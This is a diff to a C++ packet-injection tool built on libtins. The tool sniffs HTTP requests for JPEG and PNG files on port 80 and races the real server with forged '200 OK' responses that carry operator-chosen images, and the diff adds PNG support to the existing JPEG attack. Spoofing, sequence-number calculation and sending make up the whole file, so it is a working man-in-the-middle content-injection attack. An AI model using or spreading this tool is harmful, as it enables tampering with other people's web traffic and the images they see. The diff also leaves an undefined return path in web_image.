@@ -6,12 +6,14 @@
 #include <algorithm>
 #include <fstream>
 #include <tins/network_interface.h>
+#include <thread>
+#include <chrono>
 using namespace Tins;
 using namespace std;
 typedef HWAddress<6> address;
 char *sf_dev;
 char *sd_dev;
-char *path;
+char *jpg_path, *png_path;
 address mac;
 struct pk_set
 {
@@ -21,26 +23,52 @@ struct pk_set
     IP new_ip;
     TCP new_tcp;
     PacketSender sender;
-    uint8_t *image;
-    u_int32_t len;
+    uint8_t *jpg,*png;
+    u_int32_t jpg_len,png_len;
     EthernetII psh_attack;
-    bool web_image(char *_data)
+    int web_image(char *_data)
     {
-        return (bool)strstr(_data,".jpg");
+        if((bool)strstr(_data,".jpg"))
+            return 1;
+        else if((bool)strstr(_data,".png"))
+            return 2;
     }
-    void image_f()
+    void image_f(int i)
     {
-        FILE *fp = fopen(path,"rb");
-        fseek(fp,0,SEEK_END);//moving list array
-        len = ftell(fp);
-        cout<<"JPEG file size : "<<len<<"\n";
-        fseek(fp,0,SEEK_SET);//moving start array
-        image = (uint8_t *)malloc(len);
-        if(fread(image,len,1,fp))
-            cout<<"success data read\n";
-        else
-            cout<<"reading data failed\n";
-        fclose(fp);
+
+        switch(i)
+        {
+        case 1:
+        {
+            FILE *fp = fopen(jpg_path,"rb");
+            fseek(fp,0,SEEK_END);//moving list array
+            jpg_len = ftell(fp);
+            cout<<"file size : "<<jpg_len<<"\n";
+            fseek(fp,0,SEEK_SET);//moving start array
+            jpg = (uint8_t *)malloc(jpg_len);
+            if(fread(jpg,jpg_len,1,fp))
+                cout<<"success data read\n";
+            else
+                cout<<"reading data failed\n";
+            fclose(fp);
+            break;
+        }
+        case 2:
+        {
+            FILE *fp = fopen(png_path,"rb");
+            fseek(fp,0,SEEK_END);//moving list array
+            png_len = ftell(fp);
+            cout<<"file size : "<<png_len<<"\n";
+            fseek(fp,0,SEEK_SET);//moving start array
+            png = (uint8_t *)malloc(png_len);
+            if(fread(png,png_len,1,fp))
+                cout<<"success data read\n";
+            else
+                cout<<"reading data failed\n";
+            fclose(fp);
+            break;
+        }
+        }
     }
     void sf_set()
     {
@@ -80,10 +108,19 @@ struct pk_set
         new_tcp.seq(tcp.ack_seq());
         new_tcp.ack_seq(tcp.seq() + payload_len);
     }
-    void chg_send()
+    void chg_send(int num)
     {
-        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nContent-Length: 1221\r\n\r\n")/RawPDU((const uint8_t *)image,len);
+
+        if(num == 1)
+        {
+        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nContent-Length: 1282\r\n\r\n")/RawPDU((const uint8_t *)jpg,jpg_len);
         sender.send(psh_attack, sd_dev);
+        }
+        else if(num == 2)
+        {
+        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/png\r\nContent-Length: 1219\r\n\r\n")/RawPDU((const uint8_t *)png,png_len);
+        sender.send(psh_attack, sd_dev);
+        }
         cout<<"send packet\n";
         debug(new_ethernet,new_ip,new_tcp);
     }
@@ -94,11 +131,15 @@ struct pk_set
         const TCP &tcp = pdu.rfind_pdu<TCP>();
         const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
         const RawPDU::payload_type& payload = raw.payload();
-        if(tcp.flags() == 0x18 && tcp.dport() == 0x50 && web_image((char *)payload.data()))
+        if(tcp.flags() == 0x18 && tcp.dport() == 0x50)
         {
+
             pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
-            chg_send();
+            if(web_image((char *)payload.data()) == 1)
+                chg_send(1);//jpeg
+            if(web_image((char *)payload.data()) == 2)
+                chg_send(2);//png
             cout<<"request packet \n";
             debug(ethernet,ip,tcp);
             cout<<payload.data()<<"\n";
@@ -109,16 +150,17 @@ struct pk_set
 };
 bool check(int argc, char *argv[])
 {
-    if(argc == 4)
+    if(argc == 5)
     {
         sf_dev = argv[1];
         sd_dev = argv[2];
-        path = argv[3];
+        jpg_path = argv[3];
+        png_path = argv[4];
         return true;
     }
     else
     {
-        cout<<"<sniffing dev> <send dev> <jpg path>\n";
+        cout<<"<sniffing dev> <send dev> <jpg path> <png path>\n";
         return false;
     }
 }
